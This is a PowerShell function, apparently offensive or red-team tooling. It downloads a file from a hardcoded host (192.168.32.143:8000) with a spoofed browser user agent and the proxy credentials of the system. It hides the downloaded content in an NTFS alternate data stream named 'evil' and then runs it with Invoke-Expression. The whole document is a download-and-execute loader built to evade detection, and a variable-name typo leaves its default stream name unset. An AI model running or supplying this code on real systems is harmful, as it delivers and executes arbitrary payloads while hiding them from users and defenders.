Function Invoke-ADS
{
  [cmdletbinding()]
  Param
  (
    [Parameter(Position = 0)]
    [ValidateNotNullorEmpty()]
    [Alias('link')]
    [string]$uri,

        
    [Parameter(Position = 1)]
    [string]$file,


    [Parameter(Position = 2)]
    [string]$adsStream
  )

  if (!$file) 
  {
    $file = "$env:TEMP\test.txt"
  }
  if (!$adsStream) 
  {
    $adStream = 'evil'
  }
  Set-Content -Path $file -Value 'Alternate Data Stream Test File'
  Get-Content -Path $file

  $ua = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-GB)'
  $uri = 'http://192.168.32.143:8000/Program.txt'
  $IESettings = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
  if ($IESettings.ProxyEnable -eq 1)
  {
    $Proxy = "http://$(($IESettings.ProxyServer.Split(';') | Where-Object -FilterScript {$_ -match 'ttp='
    }) -replace '.*=')"
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -ProxyUseDefaultCredentials -Proxy $Proxy -UseBasicParsing
  }
  else 
  {
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -UseBasicParsing
  }

  Add-Content -Encoding Byte -Path $file -Value $request.Content -Stream $adStream
  Invoke-Expression -Command (Get-Content -Path $file -Stream $adStream -Raw)
}
